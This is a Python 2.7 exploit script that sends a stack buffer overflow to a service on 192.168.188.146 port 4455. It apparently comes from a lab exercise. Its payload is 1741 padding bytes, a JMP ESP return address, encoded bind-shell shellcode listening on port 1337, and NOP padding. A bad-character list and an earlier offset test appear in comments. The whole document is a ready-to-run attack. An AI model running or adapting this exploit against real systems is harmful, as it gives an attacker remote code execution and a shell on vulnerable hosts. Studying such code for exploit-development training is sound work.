#!/usr/bin/env python2.7

import socket

# bad characters \x04\x11\x1f\x4b\x5c\x00
# listens on port 1337
payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x26\xe4\xec\x03\x83\xee\xfc\xe2\xf4\xda\x0c\x6e\x03\x26\xe4"
"\x8c\x8a\xc3\xd5\x2c\x67\xad\xb4\xdc\x88\x74\xe8\x67\x51\x32"
"\x6f\x9e\x2b\x29\x53\xa6\x25\x17\x1b\x40\x3f\x47\x98\xee\x2f"
"\x06\x25\x23\x0e\x27\x23\x0e\xf1\x74\xb3\x67\x51\x36\x6f\xa6"
"\x3f\xad\xa8\xfd\x7b\xc5\xac\xed\xd2\x77\x6f\xb5\x23\x27\x37"
"\x67\x4a\x3e\x07\xd6\x4a\xad\xd0\x67\x02\xf0\xd5\x13\xaf\xe7"
"\x2b\xe1\x02\xe1\xdc\x0c\x76\xd0\xe7\x91\xfb\x1d\x99\xc8\x76"
"\xc2\xbc\x67\x5b\x02\xe5\x3f\x65\xad\xe8\xa7\x88\x7e\xf8\xed"
"\xd0\xad\xe0\x67\x02\xf6\x6d\xa8\x27\x02\xbf\xb7\x62\x7f\xbe"
"\xbd\xfc\xc6\xbb\xb3\x59\xad\xf6\x07\x8e\x7b\x8c\xdf\x31\x26"
"\xe4\x84\x74\x55\xd6\xb3\x57\x4e\xa8\x9b\x25\x21\x1b\x39\xbb"
"\xb6\xe5\xec\x03\x0f\x20\xb8\x53\x4e\xcd\x6c\x68\x26\x1b\x39"
"\x53\x76\xb4\xbc\x43\x76\xa4\xbc\x6b\xcc\xeb\x33\xe3\xd9\x31"
"\x7b\x69\x23\x8c\x2c\xab\x9a\x60\x84\x01\x26\xe1\xd5\x8a\xc0"
"\x8e\xfc\x55\x71\x8c\x75\xa6\x52\x85\x13\xd6\xa3\x24\x98\x0f"
"\xd9\xaa\xe4\x76\xca\x8c\x1c\xb6\x84\xb2\x13\xd6\x4e\x87\x81"
"\x67\x26\x6d\x0f\x54\x71\xb3\xdd\xf5\x4c\xf6\xb5\x55\xc4\x19"
"\x8a\xc4\x62\xc0\xd0\x02\x27\x69\xa8\x27\x36\x22\xec\x47\x72"
"\xb4\xba\x55\x70\xa2\xba\x4d\x70\xb2\xbf\x55\x4e\x9d\x20\x3c"
"\xa0\x1b\x39\x8a\xc6\xaa\xba\x45\xd9\xd4\x84\x0b\xa1\xf9\x8c"
"\xfc\xf3\x5f\x1c\xb6\x84\xb2\x84\xa5\xb3\x59\x71\xfc\xf3\xd8"
"\xea\x7f\x2c\x64\x17\xe3\x53\xe1\x57\x44\x35\x96\x83\x69\x26"
"\xb7\x13\xd6")

# 0x56266683 JMP ESP 

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.188.146",4455))
    #s.send('OVRFLW ' + 'A' * 1741 + 'BBBB' + 'C' * 562)
    s.send('OVRFLW ' + 'A' * 1741 + '\x83\x66\x26\x56' + payload + "\x90" * 214)
    s.close()

except:
    print "[-] Could not connect to the server"
